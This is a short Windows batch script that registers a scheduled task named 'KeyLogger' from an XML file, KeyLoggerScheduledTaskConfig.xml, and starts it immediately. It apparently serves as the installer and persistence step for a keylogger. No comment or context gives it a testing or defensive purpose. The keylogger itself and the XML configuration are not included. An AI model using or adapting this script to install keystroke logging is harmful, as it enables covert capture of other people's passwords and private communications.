pushd %~dp0
schtasks /create /tn KeyLogger /xml KeyLoggerScheduledTaskConfig.xml
schtasks /run /tn KeyLogger